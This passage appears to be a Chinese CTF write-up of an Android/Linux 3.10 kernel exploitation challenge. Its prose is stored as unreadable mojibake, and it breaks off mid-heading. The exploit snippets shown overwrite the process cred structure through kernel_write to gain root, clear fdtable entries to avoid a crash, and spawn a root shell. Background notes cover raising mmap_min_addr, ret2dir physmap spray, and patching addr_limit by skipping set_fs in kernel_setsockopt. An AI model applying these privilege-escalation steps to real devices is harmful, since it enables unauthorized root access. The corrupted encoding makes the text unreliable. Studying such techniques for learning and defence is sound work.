ç‰‡æ®µå¦‚ä¸‹ï¼š\n\n```c\n\t// set cred to get root\n\tint a = 0;\n\tkernel_write((char*)cred_addr+4,&a,4);\n\tkernel_write((char*)cred_addr+8,&a,4);\n\tkernel_write((char*)cred_addr+12,&a,4);\n\tkernel_write((char*)cred_addr+16,&a,4);\t\n\tkernel_write((char*)cred_addr+20,&a,4);\n\tkernel_write((char*)cred_addr+24,&a,4);\n\tkernel_write((char*)cred_addr+28,&a,4);\n\tkernel_write((char*)cred_addr+32,&a,4);\t\n\n\tif(getuid() == 0){\n\t\tprintf(\"now the uid is 0\\n\");\n\t}else{\n\t\tprintf(\"failed\\n\");\n\t}\n```\n\nè¯¥æ­¥éª¤çš„æºç å‚è€ƒï¼š[æ­¥éª¤äº”çš„æºç ](step5.c)\n\n![image-20220920182949779](image-20220920182949779.png?size=600)\n\n\n\n## æ­¥éª¤6. ç¨³å®šshell\n\n[Module to print the open files of a process](https://tuxthink.blogspot.com/2012/05/module-to-print-open-files-of-process.html)\n\ntask_struct->files->fdt->max_fdså­˜å‚¨ç€å½“å‰è¿›ç¨‹æ‰“å¼€çš„æ–‡ä»¶ä¸ªæ•°ä¿¡æ¯ï¼ˆçŒœæµ‹å½“è¿›ç¨‹é€€å‡ºæ—¶ä¼šæ ¹æ®è¯¥ä¿¡æ¯ï¼Œä¾æ¬¡å…³é—­å„ä¸ªæ‰“å¼€çš„æ–‡ä»¶ï¼‰ã€‚ä¸ºé˜²æ­¢å…¶ä»–socketå…³é—­æ—¶crashï¼Œæˆ‘ä»¬éœ€è¦å°†è¯¥å€¼æ”¹ä¸º0ã€‚\n\n[files_structç»“æ„ä½“](https://elixir.bootlin.com/linux/v3.10.108/source/include/linux/fdtable.h#L45)\n\n- ç¡®å®š`files_struct *files`åœ¨`tast_struct`ä¸­çš„åç§»\n\n  `get_files_struct()`å‡½æ•°ä¸­é€šè¿‡ä½¿ç”¨äº†files_structï¼Œé€šè¿‡æ¯”å¯¹ï¼Œå¾—åˆ°æœ¬é¢˜ä¸­files_structåœ¨tast_structä¸­çš„åç§»é‡ä¸º0x788å­—èŠ‚ã€‚\n\n  ```c\n  // åœ¨linux 3.10çš„æºç ä¸­æ‰¾åˆ°å¦‚ä¸‹å‡½æ•°ï¼Œè°ƒç”¨äº†task->files\n  struct files_struct *get_files_struct(struct task_struct *task)\n  {\n  \tstruct files_struct *files;\n  \n  \ttask_lock(task);\n  \tfiles = task->files;\n  \tif (files)\n  \t\tatomic_inc(&files->count);\n  \ttask_unlock(task);\n  \n  \treturn files;\n  }\n  // åœ¨Imageä¸­æ‰¾åˆ°å¯¹åº”çš„ä¼ªä»£ç ï¼Œç¡®è®¤filesåœ¨task_structä¸­çš„åç§»é‡æ˜¯0x788\n  unsigned int *__fastcall get_files_struct(__int64 a1)\n  {\n    __int64 v2; // x20\n    unsigned int *v3; // x19\n    unsigned int v4; // w0\n  \n    v2 = a1 + 0x818;\n    raw_spin_lock(a1 + 0x818);\n    v3 = *(unsigned int **)(a1 + 0x788);\t\t// files = task->files\n    if ( v3 )\n    {\n      do\n        v4 = __ldxr(v3);\n      while ( __stxr(v4 + 1, v3) );\n    }\n    raw_spin_unlock(v2);\n    return v3;\n  }\n  ```\n\n- ç¡®å®š`fdtable *fdt`åœ¨`files_struct`ä¸­çš„åç§»\n\n  `do_dup2()`å‡½æ•°ä¸­ä½¿ç”¨åˆ°äº†fdtï¼Œå¦‚ä¸‹ä»£ç æ®µã€‚æ‰€ä»¥æœ¬é¢˜ç¯å¢ƒä¸­ï¼Œ`fdtable *fdt`åœ¨`files_struct`ä¸­çš„åç§»é‡ä¸º8å­—èŠ‚ã€‚\n\n  ```c\n  // æºç \n  static int do_dup2(struct files_struct *files,\n  \tstruct file *file, unsigned fd, unsigned flags)\n  {\n  \tstruct file *tofree;\n  \tstruct fdtable *fdt;\n  \tfdt = files_fdtable(files);\n  \ttofree = fdt->fd[fd];\n  \t// ......\n  }\n  // IDAä¼ªä»£ç \n  __int64 __fastcall do_dup2(__int64 a1, __int64 a2, int a3, int a4)\n  {\n    // ......\n    v5 = 8i64 * (unsigned int)a3;\n    v6 = *(_QWORD **)(a1 + 8);\t//ä»file_structåç§»8å­—èŠ‚çš„ä½ç½®ï¼Œå–å‡ºfdtçš„åœ°å€\n    v7 = *(_QWORD *)(v6[1] + v5);\n    // ......\n  }\n  ```\n\næ ¹æ®ä»¥ä¸Šä¿¡æ¯ï¼Œå¯é€šè¿‡å¦‚ä¸‹ä»£ç ç‰‡æ®µï¼Œæ¸…ç†æ‰“å¼€çš„socket fdï¼Œé¿å…å†…æ ¸crashã€‚\n\n```c\n\t// clean fds\n\tvoid* files_struct_addr = 0;\n\tvoid* fdtable_addr = 0;\n\tkernel_read((char*)task_struct_addr+0x788,&files_struct_addr,8);\n\tkernel_read((char*)files_struct_addr+8,&fdtalbe_addr,8);\n\n\tkernel_write(fdtable_addr,&a,4);\n```\n\nå¼¹root shell\n\n```c\n\t// root shell\n\tif(getuid() == 0){\n\t\tsystem(\"/system/bin/sh\");\n\t}else{\n\t\tprintf(\"failed\\n\");\n\t}\n```\n\nå®Œæ•´åˆ©ç”¨ä»£ç ï¼š[æ­¥éª¤å…­æºç ](step6.c)\n\næ•ˆæœå¦‚ä¸‹ï¼š\n\n![image-20220921123726416](image-20220921123726416.png?size=600)\n\n# çŸ¥è¯†ç‚¹è¡¥å……\n\n> å­¦ä¹ æœ¬é¢˜expçš„è¿‡ç¨‹ä¸­ï¼Œè¡¥äº†ä¸å°‘çŸ¥è¯†ç‚¹ï¼Œå…¨éƒ½è®°å½•åœ¨è¿™é‡Œ\n\n## linux rlimitèµ„æºé™åˆ¶\n\n[Linux rlimit å‡½æ•°è¯¦è§£](https://blog.csdn.net/rikeyone/article/details/88798384)\n\n[Linuxç³»ç»Ÿè°ƒç”¨--getrlimit()ä¸setrlimit()å‡½æ•°è¯¦è§£](https://www.cnblogs.com/niocai/archive/2012/04/01/2428128.html)\n\næ“ä½œç³»ç»Ÿèƒ½æä¾›çš„èµ„æºæœ‰é™ï¼Œæ‰€ä»¥å¿…é¡»é™åˆ¶æ¯ä¸ªè¿›ç¨‹ä½¿ç”¨çš„èµ„æºæ•°ï¼Œåœ¨linuxä¸Šè¿™ä¸ªæœºåˆ¶å«åš[rlimit](https://docs.oracle.com/cd/E19253-01/819-7053/faayq/index.html)ã€‚ä¸ä¹‹ç›¸å…³çš„ä¸€ä¸ªç»“æ„ä½“æ˜¯ï¼š\n\n```c\nstruct rlimit {\n\t__kernel_ulong_t\trlim_cur;\t\t\t// soft limit \n\t__kernel_ulong_t\trlim_max;\t\t\t// hard limit\n};\n// soft limit <= hard limit\n// soft limitæ˜¯æ™®é€šç”¨æˆ·å¯æ›´æ”¹çš„ï¼Œhard limitåªæœ‰rootç”¨æˆ·æ‰èƒ½æ›´æ”¹\n```\n\næ›´æ”¹rlimitå€¼æœ‰ä¸¤ç§æ–¹å¼ï¼š\n\n- ulimitå‘½ä»¤\n\n  > ulimitæ”¹å˜çš„æ˜¯å½“å‰shellçš„resource limitï¼Œä»è€Œæ”¹å˜è¯¥shellå¯åŠ¨çš„è¿›ç¨‹çš„resource limit\n\n  ```shell\n  # ulimit -a\n  time(cpu-seconds)    unlimited\n  file(blocks)         unlimited\n  coredump(blocks)     0\n  data(KiB)            unlimited\n  stack(KiB)           8192\n  lockedmem(KiB)       64\n  nofiles(descriptors) 1024\n  processes            4004\n  sigpending           4004\n  msgqueue(bytes)      819200\n  maxnice              40\n  maxrtprio            0\n  resident-set(KiB)    unlimited\n  address-space(KiB)   unlimited\n  ```\n\n- getlimit()å’Œsetlimit()ä¸¤ä¸ªAPIå‡½æ•°\n\n  ```c\n  // æ›´æ”¹soft limitçš„demo\n  #include <stdio.h>\n  #include <stdlib.h>\n  #include <linux/resource.h>\n  int main()\n  {\n  \tstruct rlimit rlim;\n  \tint ret;\n  \n  \tret = getrlimit(RLIMIT_NOFILE, &rlim);   // è¯»å–RLIMIT_NOFILEè¿™ä¸ªèµ„æºçš„é™åˆ¶å€¼\n  \n  //\tprintf(\"rlim.rlim_cur:%d\\n\",rlim.rlim_cur);\n  //\tprintf(\"rlim.rlim_max:%d\\n\",rlim.rlim_max);\n  \n  \trlim.rlim_cur = rlim.rlim_max;\n  \tsetrlimit(RLIMIT_NOFILE, &rlim);\t// æ›´æ”¹äº†soft limitåï¼Œé‡æ–°å†™å›å†…æ ¸\n  \n  \treturn 0;\n  }\n  ```\n\n\nä»¥ä¸Šæ˜¯å¯¹å½“å‰è¿›ç¨‹çš„resource limitè¿›è¡Œä¿®æ”¹ï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬éœ€è¦æ›´æ”¹å…¶ä»–è¿›ç¨‹çš„resource limitæ—¶ï¼Œåº”è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿå¯¹äºé«˜ç‰ˆæœ¬å†…æ ¸ï¼Œå¯ä»¥ä½¿ç”¨prlimit()å‡½æ•°æˆ–prlimitå‘½ä»¤ã€‚\n\næŸ¥çœ‹æŸä¸€è¿›ç¨‹çš„resource limitï¼š`cat /proc/<pid>/limits`\n\n\n\n\n\n\n\n## mmapå‡½æ•°\n\n[è®¤çœŸåˆ†æmmapï¼šæ˜¯ä»€ä¹ˆ ä¸ºä»€ä¹ˆ æ€ä¹ˆç”¨ ](https://www.cnblogs.com/huxiao-tee/p/4660352.html)\n\n[Linux å†…å­˜æ˜ å°„å‡½æ•° mmapï¼ˆï¼‰å‡½æ•°è¯¦è§£](https://www.cnblogs.com/xueqiuqiu/articles/12884736.html)\n\n[ä½ çœŸçš„çŸ¥é“åŒ¿åæ˜ å°„æ˜¯ä»€ä¹ˆå—ï¼Ÿ](https://www.jianshu.com/p/b24265a3a222)\n\nmmapå°†æ–‡ä»¶æˆ–è®¾å¤‡æ˜ å°„è¿›å†…å­˜ã€‚ä½†æ˜¯å¯¹å®‰å…¨ç ”ç©¶å‘˜æ¥è¯´ï¼Œç”¨çš„æœ€å¤šçš„æ˜¯å®ƒçš„åŒ¿åæ˜ å°„ï¼ˆä¸å°†æ˜ å°„åŒºä¸ä»»ä½•æ–‡ä»¶å…³è”ï¼‰ã€‚å‡½æ•°åŸå‹å¦‚ä¸‹ï¼š\n\n```c\nvoid *mmap(void *start, size_t length, int prot, int flags, int fd, off_t offset);\n// startï¼šæ˜ å°„åŒºçš„å¼€å§‹åœ°å€ã€‚å¦‚æœæŒ‡å®šä¸ºNULLä»£è¡¨è®©ç³»ç»Ÿè‡ªåŠ¨é€‰å®šåœ°å€ï¼Œæ˜ å°„æˆåŠŸåè¿”å›è¯¥åœ°å€\n// lengthï¼šæ˜ å°„åŒºçš„é•¿åº¦\n// protï¼šæœŸæœ›çš„å†…å­˜ä¿æŠ¤æ ‡å¿—ï¼Œä¸èƒ½ä¸æ–‡ä»¶çš„æ‰“å¼€æ¨¡å¼å†²çªã€‚PROT_EXEC/PROT_READ/PROT_WRITE/PROT_NONE\n// flagsï¼šæŒ‡å®šæ˜ å°„å¯¹è±¡çš„ç±»å‹ï¼Œæ˜ å°„é€‰é¡¹å’Œæ˜ å°„é¡µæ˜¯å¦å¯ä»¥å…±äº«ã€‚MAP_FIXED/MAP_SHARED/MAP_PRIVATE/MAP_ANONYMOUSç­‰\n// fdï¼šæœ‰æ•ˆçš„æ–‡ä»¶æè¿°è¯ã€‚å¦‚æœMAP_ANONYMOUSè¢«è®¾å®šï¼Œä¸ºäº†å…¼å®¹é—®é¢˜ï¼Œå…¶å€¼åº”ä¸º-1\n// offsetï¼šè¢«æ˜ å°„å¯¹è±¡å†…å®¹çš„èµ·ç‚¹\n```\n\nåŒ¿åæ˜ å°„æ˜¯æŒ‡åœ¨flagsä¸­æŒ‡å®šäº†`MAP_ANONYMOUS`ï¼Œå¹¶ä¸”fdè¢«ç½®ä¸º-1çš„æƒ…å†µã€‚\n\n## mmap_min_addr\n\n[mmap x86å°äº0x10000çš„è™šåœ°å€](http://richardustc.github.io/2013-05-21-2013-05-21-min-mmap-addr.html)\n\nä½¿ç”¨`cat /proc/sys/vm/mmap_min_addr`æŸ¥çœ‹å½“å‰ç³»ç»Ÿä¸­å…è®¸mmapçš„æœ€ä½åœ°å€ã€‚æœ‰ä¸¤ç§æ–¹æ³•å¯ä»¥æ”¹å˜è¿™ä¸ªé™åˆ¶ï¼š\n\n1. é€šè¿‡`echo 4096 > /proc/sys/vm/mmap_min_addr`æ›´æ”¹æœ€ä½åœ°å€çš„é™åˆ¶ã€‚\n\n2. åŠ«æŒå†…æ ¸æ§åˆ¶æµï¼Œæ›´æ”¹mmap_min_addrçš„å€¼\n\n   ```c\n   __int64 mmap_min_addr_handler()\n   {\n     __int64 result; // x0\n   \n     result = proc_doulongvec_minmax();\n     MEMORY[0xFFFFFFC000652148] = 4096i64;\t\t\t// 0xFFFFFFC000652148å°±æ˜¯mmap_min_addrçš„åœ°å€\n     return result;\n   }\n   ```\n\n   \n\n## ret2dir\n\n> æå‡ºret2dirè¿™ç§åˆ©ç”¨æ–¹æ³•çš„è®ºæ–‡ï¼ˆUSENIX 2014ï¼‰ï¼š[ret2dir: Rethinking Kernel Isolation](https://www.usenix.org/system/files/conference/usenixsecurity14/sec14-paper-kemerlis.pdf)\n\nret2dirä¸­ä¸€ä¸ªå…³é”®æŠ€æœ¯å«physmap sprayã€‚\n\nphysmapæ˜¯64ä½linuxå†…æ ¸å†…å­˜å¸ƒå±€ä¸­çš„ä¸€ä¸ªåŒºåŸŸï¼Œè¯¥åŒºåŸŸå†…å­˜æ¯”è¾ƒç‰¹æ®Šï¼Œç§°ä½œ\"direct mapping of all physical memory\"ï¼Œå¤§å°æ˜¯64TBã€‚ä¹Ÿå°±æ˜¯è¯´ä»»æ„ç‰©ç†å†…å­˜åœ°å€éƒ½å¯ä»¥æ˜ å°„åˆ°physmapè™šæ‹Ÿå†…å­˜ä¸­ã€‚\n\nåˆ©ç”¨physmapè¿™ä¸€åŒºåŸŸï¼Œå¯ä»¥ç»•è¿‡ä¸€äº›linuxå†…æ ¸æ¼æ´ç¼“è§£æªæ–½ï¼Œå¦‚SMAPï¼ŒSMEPç­‰ã€‚æ”»å‡»è€…é€šè¿‡mmapå°†payloadæ”¾å…¥è™šæ‹Ÿå†…å­˜ï¼ˆä¹Ÿåœ¨ç‰©ç†å†…å­˜ä¸­ï¼‰ï¼Œç›¸åº”åœ°ä¸€å®šèƒ½åœ¨physmapä¸­æ‰¾åˆ°è¿™äº›payloadï¼Œä»è€Œè¾¾åˆ°åœ¨å†…æ ¸ä¸­è®¿é—®ç”¨æˆ·æ€æ•°æ®æˆ–æ‰§è¡Œç”¨æˆ·æ€ä»£ç çš„ç›®çš„ã€‚\n\né€šè¿‡å¦‚ä¸‹æ–‡ç« ä¸­çš„å°å®éªŒæ¥äº†è§£physmapï¼š\n\n- [ã€linuxå†…æ ¸æ¼æ´åˆ©ç”¨ã€‘ret2diråˆ©ç”¨æ–¹æ³•](https://www.jianshu.com/p/3c662b6163a7)\n\n- [linux kernel pwn ä¹‹ ret2dir å­¦ä¹ ](https://www.anquanke.com/post/id/185408)\n\nåœ¨å¯¹physmapçš„ç ”ç©¶è¿‡ç¨‹ä¸­ï¼Œæœ‰ä»¥ä¸‹å‡ ä¸ªé—®é¢˜ï¼š\n\n- kmallocçš„å†…å­˜æ˜¯å¦åœ¨physmapåŒºåŸŸï¼Ÿ\n\n  ```\n  åœ¨x86_64ä½ubuntu20.04è™šæ‹Ÿæœºä¸­ï¼ŒéªŒè¯è¯æ˜å†…æ ¸ä¸­kmallocçš„å†…å­˜åœ¨physmapåŒºåŸŸã€‚\n  ```\n\n- mmapçš„å†…å­˜æ˜¯å¦åœ¨physmapåŒºåŸŸï¼Ÿ\n\n  ```\n  é€šè¿‡gdb dumpå†…å­˜ï¼Œçœ‹åˆ°äº†mmapè™šæ‹Ÿå†…å­˜å¯¹åº”çš„å†…å®¹\n  ```\n\n- mmapçš„å†…å­˜ï¼Œä¸kmallocçš„å†…å­˜ï¼Œå®ƒä»¬åœ¨physmapä¸­çš„åˆ†å¸ƒç‰¹ç‚¹ï¼Ÿ\n\n  ```\n  - kmallocåˆ†é…çš„å†…å­˜éµå¾ªSLUBåˆ†é…å™¨çš„åŸåˆ™\n  - mmapå‡ºæ¥çš„å†…å­˜ï¼Œåœ¨vmware ubuntuä¸­ä»¥1kä¸ºå•ä½å—ï¼Œæ— è§„åˆ™åˆ†å¸ƒåœ¨physmapåŒºåŸŸï¼ˆå› ä¸ºåœ¨ç‰©ç†å†…å­˜ä¸­åˆ†å¸ƒä¸å‡åŒ€ï¼Ÿï¼‰\n  ```\n\nå¦‚æœkmallocçš„å†…å­˜å­˜åœ¨UAFï¼Œç”¨æˆ·æ€mmapçš„å¤§é‡å†…å­˜åœ¨ç‰©ç†ä¸Šå¯èƒ½è·ŸUAFçš„æŸäº›åŒºåŸŸæœ‰é‡å ã€‚äºæ˜¯ï¼Œå°±è¾¾åˆ°äº†åœ¨ç”¨æˆ·æ€æ“ä½œmmapå†…å­˜ï¼Œèƒ½æ§åˆ¶å†…æ ¸UAFå †ä¸­æ•°æ®çš„ç›®çš„ã€‚è¿™ä¹Ÿæ˜¯CVE-2015-3636æ¼æ´åˆ©ç”¨ä¸­ï¼Œphysmap sprayä½¿ç”¨åˆ°çš„æ ¹æœ¬åŸç†ã€‚\n\nä½†æ˜¯ï¼Œæ¶‰åŠåˆ°linuxå†…æ ¸å†…å­˜ç®¡ç†çš„çŸ¥è¯†ï¼Œç›®å‰æˆ‘çš„å‚¨å¤‡ä¸º0ï¼Œæ‰€ä»¥ç»†èŠ‚æ–¹é¢æ— æ³•å±•å¼€è¯´æ˜ã€‚è¿™ä¸€çŸ¥è¯†ç›²åŒºç•™å¾…åç»­ç ”ç©¶linuxå†…å­˜ç®¡ç†æ—¶å†æ·±å…¥è°ƒè¯•æ¢ç©¶ï¼Œå‚è€ƒè¿™ç¯‡æ–‡ç« ä¸­æä¾›çš„ä¹¦ç±å’Œå¸–å­å­¦ä¹ ï¼š[What's inside the kernel part of virtual memory of 64 bit linux processes?](https://unix.stackexchange.com/questions/512849/whats-inside-the-kernel-part-of-virtual-memory-of-64-bit-linux-processes)\n\n\n\nï¼Ÿï¼Ÿï¼Ÿä½†æ˜¯ï¼Œä»kpwnè¿™ä¸ªé¢˜çš„ç¯å¢ƒæ¥çœ‹ï¼Œè·Ÿhttps://bbs.pediy.com/thread-230298.htmä¸­å¯¹physmapå’Œslabçš„æè¿°å¹¶ä¸ä¸€æ ·ã€‚\n\nï¼Ÿï¼Ÿï¼Ÿkpwnï¼škmallocçš„å†…å­˜å°±åœ¨physmapä¸­\n\nï¼Ÿï¼Ÿï¼Ÿçœ‹é›ªï¼škmallocçš„å†…å­˜éœ€è¦é€šè¿‡liftingæ‰èƒ½è·Ÿphysmapäº§ç”Ÿäº¤é›†\n\n\n\n\n\n## socketçš„inet_ioctl\n\n### inet_ioctl\n\nlinux-3.10-rc1/net/ipv4/af_inet.cä¸­ï¼Œæœ‰ä»¥ä¸‹æ¥å£ï¼š\n\n```c\nint inet_ioctl(struct socket *sock, unsigned int cmd, unsigned long arg)\n{\n\tstruct sock *sk = sock->sk;\n\tint err = 0;\n\tstruct net *net = sock_net(sk);\n\n\tswitch (cmd) {\n\tcase SIOCGSTAMP:\n\t\terr = sock_get_timestamp(sk, (struct timeval __user *)arg);\n\t\tbreak;\n\tcase SIOCGSTAMPNS:\n\t\terr = sock_get_timestampns(sk, (struct timespec __user *)arg);\n\t\tbreak;\n\tÂ·Â·Â·Â·Â·Â·\n```\n\n### sock_get_timestampns\n\nlinux-3.10-rc1/net/core/sock.cä¸­ï¼Œå®ç°äº†sock_get_timestampnså‡½æ•°\n\n```c\nstruct timespec {\n        time_t  tv_sec;         /* seconds */\n        long    tv_nsec;        /* nanoseconds */\n};\n\nint sock_get_timestampns(struct sock *sk, struct timespec __user *userstamp)\n{\n\tstruct timespec ts;\n\tif (!sock_flag(sk, SOCK_TIMESTAMP))\n\t\tsock_enable_timestamp(sk, SOCK_TIMESTAMP);\n\tts = ktime_to_timespec(sk->sk_stamp);\n\tif (ts.tv_sec == -1)\n\t\treturn -ENOENT;\n\tif (ts.tv_sec == 0) {\n\t\tsk->sk_stamp = ktime_get_real();\n\t\tts = ktime_to_timespec(sk->sk_stamp);\n\t}\n\treturn copy_to_user(userstamp, &ts, sizeof(ts)) ? -EFAULT : 0;\n}\nEXPORT_SYMBOL(sock_get_timestampns);\n\n#if (BITS_PER_LONG == 64) || defined(CONFIG_KTIME_SCALAR)\n/* Map the ktime_t to timespec conversion to ns_to_timespec function */\n#define ktime_to_timespec(kt)\t\tns_to_timespec((kt).tv64)\n```\n\n### ns_to_timespec\n\nlinux-3.10-rc1/kernel/time.czä¸­ï¼Œå®ç°äº†ns_to_timespecå‡½æ•°\n\n```c\ntypedef union ktime ktime_t;\nunion ktime {\n\ts64\ttv64;\n#if BITS_PER_LONG != 64 && !defined(CONFIG_KTIME_SCALAR)\n\tstruct {\n# ifdef __BIG_ENDIAN\n\ts32\tsec, nsec;\n# else\n\ts32\tnsec, sec;\n# endif\n\t} tv;\n#endif\n};\n\nstruct timespec ns_to_timespec(const s64 nsec)\n{\n\tstruct timespec ts;\n\ts32 rem;\n\n\tif (!nsec)\n\t\treturn (struct timespec) {0, 0};\n\n\tts.tv_sec = div_s64_rem(nsec, NSEC_PER_SEC, &rem);\n\tif (unlikely(rem < 0)) {\n\t\tts.tv_sec--;\n\t\trem += NSEC_PER_SEC;\n\t}\n\tts.tv_nsec = rem;\n\n\treturn ts;\n}\nEXPORT_SYMBOL(ns_to_timespec);\n```\n\n[Linuxå†…æ ¸ ns_to_timespec()](https://www.coolcou.com/linux-kernel/linux-kernel-timing-mechanism-api/the-linux-kernel-ns-to-timespec.html)\n\nè¯¥å‡½æ•°çš„ä½œç”¨æ˜¯å°†å‚æ•°çš„æ—¶é—´ï¼ˆçº³ç§’ï¼‰ç”¨timespecç»“æ„ä½“æ¥è¡¨ç¤ºï¼Œç»“æ„ä½“å¦‚ä¸‹\n\n```c\nstruct timespec\n{\n    __kernel_time_t       tv_sec;         /*ç§’æ•°*/\n    long                    tv_nsec;        /*çº³ç§’æ•°*/\n};\n```\n\né€šè¿‡ç¼–å†™ä¸€ä¸ªç®€å•çš„å†…æ ¸æ¨¡å—ï¼Œå¼„æ˜ç™½è¿™ä¸ªå‡½æ•°çš„ç”¨æ³•\n\n```c\n#include <linux/module.h>\n#include<linux/time.h>\n\nint __init ns_to_timespec_init(void)\n{\n\n    struct timespec ts;           //å£°æ˜å˜é‡ï¼Œç”¨äºä¿å­˜å‡½æ•°æ‰§è¡Œç»“æœ\n    const s64 nsec=1001000000;    //1001000000ï¼Œå®šä¹‰64ä½æœ‰ç¬¦å·æ•´æ•°ï¼Œä½œä¸ºå‡½æ•°çš„å‚æ•°\n    printk(\"ns_to_timespec begin.\\n\");\n    ts=ns_to_timespec(nsec);      //è°ƒç”¨å‡½æ•°ï¼Œå°†å‚æ•°è¡¨ç¤ºçš„æ—¶é—´è½¬æ¢æˆç”¨timespecè¡¨ç¤ºçš„æ—¶é—´\n    printk(\"the value of the struct timespec is:\\n\"); //æ˜¾ç¤ºè½¬æ¢ç»“æœ\n    printk(\"the tv_sec value is:%ld\\n\", ts.tv_sec);    //ç§’æ•°ï¼Œä¸º1\n    printk(\"the tv_nsec value is:%ld\\n\", ts.tv_nsec); //çº³ç§’æ•°ï¼Œä¸º1000000\n    printk(\"ns_to_timespec over.\\n\");\n    return 0;\n}\n\nvoid __exit ns_to_timespec_exit(void)\n{\n    printk(\"Goodbye ns_to_timespec\\n\");\n}\n\nmodule_init(ns_to_timespec_init);\nmodule_exit(ns_to_timespec_exit);\n\nMODULE_LICENSE(\"GPL\");\n```\n\n\n\n## addr limitè®¿é—®é™åˆ¶\n\n### addr limitæ˜¯ä»€ä¹ˆ\n\naddr_limitæ˜¯thread_infoä¸­çš„ä¸€ä¸ªå€¼ï¼Œå®ƒä»£è¡¨å½“å‰çº¿ç¨‹å¯è®¿é—®çš„åœ°å€ç©ºé—´å¤§å°ã€‚x86_64æ¶æ„ä¸‹ï¼Œåœ¨ç”¨æˆ·ç¨‹åºaddr_limitä¸º0x7ffffffff000ï¼Œåœ¨å†…æ ¸addr_limitä¸º0xffffffffffffffffã€‚\n\n```c\ntypedef unsigned long mm_segment_t;\n\nstruct thread_info {\n\tunsigned long\t\tflags;\t\t/* low level flags */\n\tmm_segment_t\t\taddr_limit;\t/* address limit */\n\tstruct task_struct\t*task;\t\t/* main task structure */\n\tstruct exec_domain\t*exec_domain;\t/* execution domain */\n\tstruct restart_block\trestart_block;\n\tint\t\t\tpreempt_count;\t/* 0 => preemptable, <0 => bug */\n\tint\t\t\tcpu;\t\t/* cpu */\n};\n```\n\nå½“ç”¨æˆ·æ€ç¨‹åºé€šè¿‡ç³»ç»Ÿè°ƒç”¨è¿›å…¥å†…æ ¸åï¼Œéœ€è¦è®¿é—®å†…æ ¸ç©ºé—´çš„æ•°æ®æ—¶è¯¥æ€ä¹ˆåŠå‘¢ï¼Ÿ\n\n> ç­”ï¼šå¯ä»¥é€šè¿‡setfs()æ¥æ”¹å˜addr_limitçš„å€¼ã€‚ç›¸å…³å®šä¹‰å¦‚ä¸‹ï¼š\n>\n> ```c\n> #define KERNEL_DS    ((mm_segment_t) { ~0UL })        /* cf. access_ok() */\n> #define USER_DS        ((mm_segment_t) { TASK_SIZE-1 })    /* cf. access_ok() */\n> \n> #define VERIFY_READ    0\n> #define VERIFY_WRITE    1\n> \n> #define get_ds()  (KERNEL_DS)\n> #define get_fs()  (current_thread_info()->addr_limit)\n> #define set_fs(x) (current_thread_info()->addr_limit = (x))\n> \n> #define TASK_SIZE           DEFAULT_TASK_SIZE \n> ```\n\n[åˆ©ç”¨CVE-2017-8890æ¼æ´ROOTå¤©çŒ«é­”å±A1](https://blog.csdn.net/fu851523125/article/details/124738473)æ–‡ç« æŒ‡å‡ºï¼Œå½“å‰æœ‰ä¸¤ç§æ–¹å¼å¯ä»¥patch addr_limitçš„å¤§å°ã€‚è¿™é‡Œæˆ‘ä»¬å…³æ³¨ç¬¬äºŒç§æ–¹æ³•ï¼Œé€šè¿‡è°ƒç”¨äº†set_fs()çš„å‡½æ•°å¦‚kernel_setsockoptã€kernel_sock_ioctlæ¥æ›´æ”¹addr_limitã€‚\n\n### kernel_setsockopt\n\nkernel_setsockopt()å‡½æ•°çš„æºç ï¼š\n\n```c\nint kernel_setsockopt(struct socket *sock, int level, int optname,\n\t\t\tchar *optval, unsigned int optlen)\n{\n\tmm_segment_t oldfs = get_fs();\n\tchar __user *uoptval;\n\tint err;\n\n\tuoptval = (char __user __force *) optval;\n\n\tset_fs(KERNEL_DS);\n\tif (level == SOL_SOCKET)\n\t\terr = sock_setsockopt(sock, level, optname, uoptval, optlen);\n\telse\n\t\terr = sock->ops->setsockopt(sock, level, optname, uoptval,\n\t\t\t\t\t    optlen);\n\tset_fs(oldfs);\n\treturn err;\n}\n```\n\nå¯¹åº”çš„æ±‡ç¼–ä»£ç ï¼š\n\n```assembly\nROM:FFFFFFC00035D788 kernel_setsockopt                       ; CODE XREF: svc_setup_socket+238â†“p\nROM:FFFFFFC00035D788                                         ; svc_setup_socket+37Câ†“p\nROM:FFFFFFC00035D788\nROM:FFFFFFC00035D788 var_s0          =  0\nROM:FFFFFFC00035D788 var_s10         =  0x10\nROM:FFFFFFC00035D788\nROM:FFFFFFC00035D788                 STP             X29, X30, [SP,#-0x20+var_s0]!\nROM:FFFFFFC00035D78C                 CMP             W1, #1\nROM:FFFFFFC00035D790                 MOV             X5, SP\nROM:FFFFFFC00035D794                 MOV             X29, SP\nROM:FFFFFFC00035D798                 STP             X19, X20, [SP,#var_s10]\nROM:FFFFFFC00035D79C                 AND             X19, X5, #0xFFFFFFFFFFFFC000\nROM:FFFFFFC00035D7A0                 MOV             X5, #0xFFFFFFFFFFFFFFFF\nROM:FFFFFFC00035D7A4                 LDR             X20, [X19,#8]\nROM:FFFFFFC00035D7A8                 STR             X5, [X19,#8]\nROM:FFFFFFC00035D7AC                 B.EQ            loc_FFFFFFC00035D7CC\nROM:FFFFFFC00035D7B0                 LDR             X5, [X0,#0x28]\nROM:FFFFFFC00035D7B4                 LDR             X5, [X5,#0x68]\nROM:FFFFFFC00035D7B8                 BLR             X5\nROM:FFFFFFC00035D7BC                 STR             X20, [X19,#8]\nROM:FFFFFFC00035D7C0                 LDP             X19, X20, [SP,#var_s10]\nROM:FFFFFFC00035D7C4                 LDP             X29, X30, [SP+var_s0],#0x20\nROM:FFFFFFC00035D7C8                 RET\n```\n\n`ROM:FFFFFFC00035D7BC STR X20, [X19,#8]`è¿™è¡Œå¯¹åº”äº`set_fs(oldfs);`ï¼Œè·³è¿‡è¿™ä¸€å¥ï¼Œç”¨æˆ·æ€è¿›ç¨‹å¯¹åº”çš„addr_limitå°±æˆäº†`0xFFFFFFFFFFFFFFFF`ï¼Œå¯ä»¥è®¿é—®å†…æ ¸ç©ºé—´äº†ã€‚\n\nä¹Ÿå°±æ˜¯è¯´å°†x5è®¾ç½®ä¸º0xFFFFFFC00035D7C0å³å¯ï¼Œé‚£ä¹ˆè¦æ±‚[x5,#0x68]å¤„å­˜æ”¾0xFFFFFFC00035D7C0ã€‚x0æ˜¯æ§åˆ¶æµåŠ«æŒå‘ç”Ÿæ—¶çš„æ®‹ç•™å€¼ï¼Œå¯æ ¹æ®å®é™…æƒ…å†µå˜æ›´ã€‚\n\n### pipeç³»ç»Ÿè°ƒç”¨\n\n[pipe() 